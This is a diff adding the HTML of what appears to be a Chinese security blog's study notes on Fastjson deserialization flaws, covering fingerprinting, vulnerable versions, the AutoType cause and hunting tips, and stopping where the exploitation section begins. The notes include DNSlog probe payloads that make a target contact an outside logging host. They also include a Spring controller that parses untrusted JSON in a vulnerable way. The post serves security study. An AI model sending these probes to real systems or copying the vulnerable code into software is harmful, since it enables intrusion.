@@ -1,0 +1,1652 @@
+<!DOCTYPE html>
+<html lang="zh-cn" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Fastjson反序列化漏洞">
+<title>Fastjson反序列化</title>
+
+<link rel='canonical' href='https://lserein.github.io/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
+
+<link rel="stylesheet" href="/scss/style.min.946cca6c6259ef94ac55abfae7c7bf3291ea3ed5eea17ef77500b257217c6710.css"><meta property='og:title' content="Fastjson反序列化">
+<meta property='og:description' content="Fastjson反序列化漏洞">
+<meta property='og:url' content='https://lserein.github.io/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/'>
+<meta property='og:site_name' content='Lsec&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-08-15T16:50:57&#43;08:00'/><meta property='article:modified_time' content='2025-08-15T17:14:57&#43;08:00'/><meta property='og:image' content='https://lserein.github.io/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/logo.jpg' />
+<meta name="twitter:title" content="Fastjson反序列化">
+<meta name="twitter:description" content="Fastjson反序列化漏洞"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://lserein.github.io/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/logo.jpg' />
+    <link rel="shortcut icon" href="/favicon.ico" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_5a2f261f7f9cea8c.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🍥</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Lsec&#39;s Blog</a></h1>
+            <h2 class="site-description">欢迎来到Lsec的博客</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Lserein/Lserein.github.io'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://x.com/secL15737016'
+                        target="_blank"
+                        title="Twitter"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>主页</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%85%B3%E4%BA%8E/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>关于</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>归档</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>搜索</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/%E5%8F%8B%E9%93%BE/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                
+                <span>友链</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>暗色模式</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">目录</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#1fastjson介绍">1.FastJson介绍</a></li>
+    <li><a href="#2如何判断网站是否使用了fastjson"><strong>2.如何判断网站是否使用了Fastjson</strong></a>
+      <ol>
+        <li><a href="#21报错回显">2.1.报错回显</a></li>
+        <li><a href="#22dnslog盲打">2.2.DNSlog盲打</a></li>
+      </ol>
+    </li>
+    <li><a href="#3fastjson历史漏洞版本">3.fastJson历史漏洞版本</a>
+      <ol>
+        <li><a href="#31fastjson漏洞原理">3.1.FastJson漏洞原理</a></li>
+      </ol>
+    </li>
+    <li><a href="#4fastjson漏洞挖掘思路">4.FastJson漏洞挖掘思路</a>
+      <ol>
+        <li><a href="#41白盒审计思路">4.1.白盒审计思路</a></li>
+        <li><a href="#42黑盒挖掘思路">4.2.黑盒挖掘思路</a></li>
+      </ol>
+    </li>
+    <li><a href="#5fastjson-利用">5.Fastjson 利用</a>
+      <ol>
+        <li><a href="#51fastjson1224-反序列化远程命令执行漏洞"><strong>5.1.Fastjson&lt;=1.2.24 反序列化远程命令执行漏洞</strong></a></li>
+        <li><a href="#"><strong><font style="color:#000000;">打入内存马</font></strong></a></li>
+        <li><a href="#52fastjson--1247反序列化远程命令执行漏洞">5.2.Fastjson &lt;= 1.2.47<strong>反序列化远程命令执行漏洞</strong></a></li>
+        <li><a href="#53c3p0二次反序列化">5.3.C3P0二次反序列化</a></li>
+        <li><a href="#54fastjson-1267版本利用">5.4.Fastjson&lt;= 1.2.67版本利用</a></li>
+        <li><a href="#55fastjson1268版本利用">5.5.FastJson&lt;=1.2.68版本利用</a></li>
+        <li><a href="#56不出网利用">5.6.不出网利用</a></li>
+      </ol>
+    </li>
+    <li><a href="#7悟空crm-fastjson反序列化漏洞">7.悟空CRM-FastJson反序列化漏洞</a></li>
+    <li><a href="#8fastjsonexploit">8.FastjsonExploit</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
+                <img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/logo_hu_9ff4ed47864b58af.jpg"
+                        srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/logo_hu_9ff4ed47864b58af.jpg 800w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/logo_hu_f5565703d8bfedab.jpg 1600w"
+                        width="800" 
+                        height="600" 
+                        loading="lazy"
+                        alt="Featured image of post Fastjson反序列化" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="background-color: #2a9d8f; color: #fff;">
+                学习笔记
+            </a>
+        
+            <a href="/categories/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="background-color: #2a9d8f; color: #fff;">
+                Java代码审计
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">Fastjson反序列化</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            Fastjson反序列化漏洞
+        </h3>
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 15, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    阅读时长: 8 分钟
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <p><a class="link" href="https://forum.butian.net/share/1679"  target="_blank" rel="noopener"
+    >奇安信攻防社区-浅谈黑盒识别Fastjson/Jackson组件</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/wlWi1g3P-iechsPH3l4sCw"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/wlWi1g3P-iechsPH3l4sCw</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/sD-VSjHoXMoLTZvMlWB0vw"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/sD-VSjHoXMoLTZvMlWB0vw</a></p>
+<h2 id="1fastjson介绍">1.FastJson介绍
+</h2><p><code>Fastjson</code><strong>是一个 Java 库，可以将 Java 对象转换为 JSON 格式，当然它也可以将 JSON 字符串转换为 Java 对象。Fastjson 可以操作任何 Java 对象，即使是一些预先存在的没有源码的对象。</strong></p>
+<h2 id="2如何判断网站是否使用了fastjson"><strong>2.如何判断网站是否使用了Fastjson</strong>
+</h2><p><a class="link" href="https://www.freebuf.com/sectool/244113.html"  target="_blank" rel="noopener"
+    >Fastjson批量检查及一键利用工具 - FreeBuf网络安全行业门户</a></p>
+<h3 id="21报错回显">2.1.报错回显
+</h3><p><strong>将Json改为</strong><code>**{&quot;test&quot;:&quot;**</code><strong>,如果目标网站使用了Fastjson组件，则可能会爆出Fastjson相关特征</strong></p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/1.png"
+	width="2554"
+	height="748"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/1_hu_7de479ce96544599.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/1_hu_2616b3ffce391146.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="341"
+		data-flex-basis="819px"
+	
+></p>
+<h3 id="22dnslog盲打">2.2.DNSlog盲打
+</h3><p><code>fastjson-1.2.67版本前</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="s">&#34;zeo&#34;</span><span class="p">:{</span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;java.net.Inet4Address&#34;</span><span class="p">,</span><span class="s">&#34;val&#34;</span><span class="p">:</span><span class="s">&#34;fatu5k.dnslog.cn&#34;</span><span class="p">}}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>fastjson-1.2.67版本后</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="p">{</span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;java.net.Inet4Address&#34;</span><span class="p">,</span><span class="s">&#34;val&#34;</span><span class="p">:</span><span class="s">&#34;dnslog&#34;</span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">{</span><span class="s">&#34;@type&#34;</span><span class="p">:</span><span class="s">&#34;java.net.Inet6Address&#34;</span><span class="p">,</span><span class="s">&#34;val&#34;</span><span class="p">:</span><span class="s">&#34;dnslog&#34;</span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/2.png"
+	width="1204"
+	height="638"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/2_hu_db602c35acb8b980.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/2_hu_4d3c8572ad450429.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="188"
+		data-flex-basis="452px"
+	
+></p>
+<h2 id="3fastjson历史漏洞版本">3.fastJson历史漏洞版本
+</h2><p><a class="link" href="https://mp.weixin.qq.com/s/mcsPexe0aIou1MHAZX8EKQ"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/mcsPexe0aIou1MHAZX8EKQ</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/zN2oIAoF1Do3NxX4WLJPfA"  target="_blank" rel="noopener"
+    >fastjson重点版本利用（含详细实验过程&amp;&amp;绕瓦夫技巧）</a></p>
+<h3 id="31fastjson漏洞原理">3.1.FastJson漏洞原理
+</h3><p><strong>Fastjson的漏洞本质还是一个java的反序列化漏洞。</strong></p>
+<p><strong><font style="color:#DF2A3F;">Fastjson在序列化的时候就会使用AutoType功能进行对序列化后的JSON字符带有一个@type来标记其字符的原始类型，在反序列化的时候会读取这个@type，来试图把JSON内容反序列化到对象，并且会调用这个库的setter或者getter方法。然而，@type的类有可能被恶意构造，只需要合理构造一个JSON，使用@type指定一个想要的攻击类库就可以实现攻击。</font></strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">fastjson反序列化是源于处理Json数据时对输入验证不足</span><span class="err">，</span><span class="n">没有对</span><span class="nd">@type进行字段过滤</span><span class="err">，</span><span class="n">导致攻击者可以</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">构造一个恶意的Json数据</span><span class="err">，</span><span class="n">将恶意类作为AutoType的值</span><span class="err">，</span><span class="n">当fastjson反序列化时</span><span class="err">，</span><span class="n">导致远程代码执行</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Fastjson</span><span class="w"> </span><span class="o">&lt;=</span><span class="n">1</span><span class="p">.</span><span class="na">2</span><span class="p">.</span><span class="na">24</span><span class="w"> </span><span class="n">反序列化远程命令执行漏洞</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Fastjson</span><span class="w"> </span><span class="o">&lt;=</span><span class="n">1</span><span class="p">.</span><span class="na">2</span><span class="p">.</span><span class="na">41</span><span class="w"> </span><span class="n">反序列化远程命令执行漏洞</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Fastjson</span><span class="w"> </span><span class="o">&lt;=</span><span class="n">1</span><span class="p">.</span><span class="na">2</span><span class="p">.</span><span class="na">42</span><span class="w"> </span><span class="n">反序列化远程命令执行漏洞</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Fastjson</span><span class="w"> </span><span class="o">&lt;=</span><span class="n">1</span><span class="p">.</span><span class="na">2</span><span class="p">.</span><span class="na">43</span><span class="w"> </span><span class="n">反序列化远程命令执行漏洞</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Fastjson</span><span class="w"> </span><span class="o">&lt;=</span><span class="n">1</span><span class="p">.</span><span class="na">2</span><span class="p">.</span><span class="na">45</span><span class="w"> </span><span class="n">反序列化远程命令执行漏洞</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Fastjson</span><span class="w"> </span><span class="o">&lt;=</span><span class="n">1</span><span class="p">.</span><span class="na">2</span><span class="p">.</span><span class="na">47</span><span class="w"> </span><span class="n">反序列化远程命令执行漏洞</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Fastjson</span><span class="w"> </span><span class="o">&lt;=</span><span class="n">1</span><span class="p">.</span><span class="na">2</span><span class="p">.</span><span class="na">62</span><span class="w"> </span><span class="n">反序列化远程命令执行漏洞</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Fastjson</span><span class="w"> </span><span class="o">&lt;=</span><span class="n">1</span><span class="p">.</span><span class="na">2</span><span class="p">.</span><span class="na">66</span><span class="w"> </span><span class="n">反序列化远程命令执行漏洞</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong>一个简单的漏洞代码段</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.example.fastjsondemo.controller</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.PostMapping</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestBody</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestParam</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RestController</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nd">@RestController</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">HelloController</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@PostMapping</span><span class="p">(</span><span class="s">&#34;/hello&#34;</span><span class="p">)</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">hello</span><span class="p">(</span><span class="nd">@RequestBody</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">jsonObject</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">name</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">jsonObject</span><span class="p">.</span><span class="na">toString</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="4fastjson漏洞挖掘思路">4.FastJson漏洞挖掘思路
+</h2><h3 id="41白盒审计思路">4.1.白盒审计思路
+</h3><ul>
+<li><strong>1.查看项目是否使用Fastjson组件（pom.xml文件/外部依赖）</strong></li>
+<li><strong>2.引用的Fastjson是否是存在漏洞版本</strong></li>
+<li><strong>3.全局搜索parseObject关键字，查看前台路由是否可控</strong></li>
+</ul>
+<h3 id="42黑盒挖掘思路">4.2.黑盒挖掘思路
+</h3><ul>
+<li><strong>1.当遇到请求体是Json格式时就可以去尝试</strong></li>
+<li><strong>2.判断是否为FastJson组件</strong></li>
+<li><strong>3.FastJson盲打</strong></li>
+</ul>
+<h2 id="5fastjson-利用">5.Fastjson 利用
+</h2><p><a class="link" href="https://blog.csdn.net/Bossfrank/article/details/130100893"  target="_blank" rel="noopener"
+    >Fastjson反序列化漏洞原理与漏洞复现（基于vulhub，保姆级的详细教程）_fastjson漏洞原理-CSDN博客</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/lGTYslO-EtLIZZf6QCfiQw"  target="_blank" rel="noopener"
+    >https://mp.weixin.qq.com/s/lGTYslO-EtLIZZf6QCfiQw</a></p>
+<p><a class="link" href="https://mp.weixin.qq.com/s/I0OdFPnRH_r1yZ04tOB-cw"  target="_blank" rel="noopener"
+    >fastjson payload大集合</a></p>
+<p><strong>靶场地址：</strong><a class="link" href="https://github.com/safe6Sec/ShiroAndFastJson"  target="_blank" rel="noopener"
+    ><strong>https://github.com/safe6Sec/ShiroAndFastJson</strong></a></p>
+<h3 id="51fastjson1224-反序列化远程命令执行漏洞"><strong>5.1.Fastjson&lt;=1.2.24 反序列化远程命令执行漏洞</strong>
+</h3><p><strong><font style="color:#DF2A3F;">环境：JDK1.8+fastjson1.2.23</font></strong></p>
+<p><strong>从pom.xml文件看，存在fastjson依赖，并且版本存在漏洞</strong></p>
+<p><img src="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/3.png"
+	width="1596"
+	height="751"
+	srcset="/p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/3_hu_1ceeb4931ad732b5.png 480w, /p/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/image/3_hu_da63ce8cfacf50c7.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="212"
+		data-flex-basis="510px"
+	
+></p>
+<p><strong>找到对应的parse方法</strong></p>
